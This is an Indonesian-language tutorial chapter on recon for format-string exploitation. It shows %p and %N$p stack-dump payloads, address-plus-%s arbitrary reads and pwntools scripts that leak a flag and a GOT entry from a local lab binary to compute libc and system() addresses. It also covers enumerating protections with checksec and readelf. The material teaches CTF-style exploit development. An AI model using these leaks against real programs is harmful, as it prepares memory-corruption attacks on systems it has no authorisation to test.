# 03 - Recon dan Enumeration

**Author**: Kenshin Himura

## Pendahuluan

Sebelum menulis ke memory, penyerang perlu mengumpulkan informasi:
di mana binary dimuat, di mana libc berada, bagaimana layout stack,
dan proteksi apa yang aktif. Bab ini membahas teknik information
leakage lewat format string.

## Information Leakage via Stack

### Membaca Nilai Stack

Format specifier `%x` dan `%p` membaca 4 byte (x86) atau 8 byte (x64)
dari stack dan menampilkannya sebagai hex:

```
Input:  %p.%p.%p.%p.%p.%p.%p.%p
Output: 0xffffd768.0x64.0xf7fadd80.0x56556200.0x41414141...
```

Setiap `%p` membaca satu slot stack. Dengan mengirim `%p` berulang,
penyerang dapat memetakan isi stack.

### Positional Argument

`%N$p` membaca argumen ke-N secara langsung:

```bash
for i in $(seq 1 100); do
    echo "%$i\$p" | ./vuln
done
```

Loop ini mendump 100 slot stack pertama. Berguna untuk mencari
nilai spesifik seperti:

- Stack canary (pola acak)
- Return address (menunjuk ke .text)
- Saved EBP (menunjuk ke stack)
- Pointer ke heap, libc, binary base

### Membaca String dari Stack

`%s` membaca string dari alamat yang tersimpan di stack. Jika stack
berisi pointer ke string berguna (environment variable, file path,
password), `%s` akan menampilkannya.

## Arbitrary Read

### Mekanisme

1. Penyerang menaruh alamat target di payload
2. Payload berada di stack (sebagai local variable)
3. `%{offset}$s` membaca alamat tersebut dan men-dereference-nya
4. Hasil: isi memory di alamat target ditampilkan

```
Payload: [alamat 4 byte] + %{offset}$s

Stack:   ... [0x0804a060] ...   <- alamat yang ditaruh penyerang
                          ^
                   %s membaca pointer ini
                          |
                   dereference ke 0x0804a060
                          |
                   membaca string di alamat tersebut
```

### Contoh: Membaca Flag dari Memory

```python
from pwn import *

p = process('./vuln')
p.recvuntil(b'secret @ ')
secret_addr = int(p.recvline().strip(), 16)

payload = p32(secret_addr) + b'%7$s'
p.sendline(payload)
print(p.recvline())  # output: flag
```

### Membaca GOT Entry

GOT entry berisi alamat fungsi libc yang sudah di-resolve. Membaca
GOT entry memberikan alamat libc runtime, yang digunakan untuk
menghitung base address libc.

```python
elf = ELF('./binary')
printf_got = elf.got['printf']

p = process('./binary')
payload = p32(printf_got) + b'%7$s'
p.sendline(payload)
leaked = p.recv(4)
printf_addr = u32(leaked)

# Hitung libc base
libc_base = printf_addr - libc.symbols['printf']
system_addr = libc_base + libc.symbols['system']
```

## Memory Layout Mapping

### Binary Base (PIE Bypass)

Jika binary di-compile dengan PIE, base address-nya acak. Untuk
menghitung base:

```python
# Leak return address dari stack
# return_addr = binary_base + offset_ke_ret
# binary_base = leaked_ret - offset_ke_ret
```

Atau leak GOT entry yang menunjuk ke PLT stub (bukan ke libc):

```python
# Sebelum lazy binding, GOT entry menunjuk ke PLT stub + 6
# binary_base = leaked_got_plt_entry - offset_plt_stub
```

### Libc Base

Setelah binary base diketahui (atau jika no-PIE), leak libc base:

```python
# printf@GOT berisi alamat printf di libc
# libc_base = leaked_printf - libc.symbols['printf']
```

### Stack Address

Saved EBP di stack menunjuk ke stack frame sebelumnya:

```python
# %N$p di offset yang tepat -> saved EBP
# stack_addr = leaked_ebp
```

### Heap Address

Pointer ke heap sering muncul di stack sebagai argumen fungsi atau
nilai return `malloc()`.

## Enumerasi Proteksi

### checksec

```bash
$ checksec --file=binary
RELRO:    Partial RELRO
STACK CANARY: No canary found
NX:       NX enabled
PIE:      No PIE
```

### Manual

```bash
# PIE
readelf -h binary | grep Type  # EXEC = no PIE, DYN = PIE

# Stack Canary
readelf -s binary | grep __stack_chk_fail

# NX
readelf -l binary | grep GNU_STACK  # E = executable, R = read, W = write

# RELRO
readelf -d binary | grep BIND_NOW  # Full RELRO, tidak ada = Partial
readelf -d binary | grep FLAGS     # FLAGS: BIND_NOW -> Full RELRO

# ASLR (system-wide)
cat /proc/sys/kernel/randomize_va_space  # 0=off, 1=partial, 2=full
```

## Strategi Leak

Urutan yang efisien:

1. Cari offset format string
2. Leak stack untuk temukan pointer berguna
3. Leak binary base (jika PIE) via return address atau GOT
4. Leak libc base via GOT entry
5. Leak stack address via saved EBP (jika perlu ROP chain)
6. Verifikasi proteksi: RELRO, NX, Canary

## Ringkasan

- `%p` / `%x`: dump nilai stack
- `%N$p`: akses langsung ke argumen ke-N
- `%s` + alamat di payload: arbitrary read
- GOT leak: dapatkan libc base -> hitung `system()` -> siap GOT overwrite
- `checksec` + `readelf`: enumerasi proteksi sebelum exploit
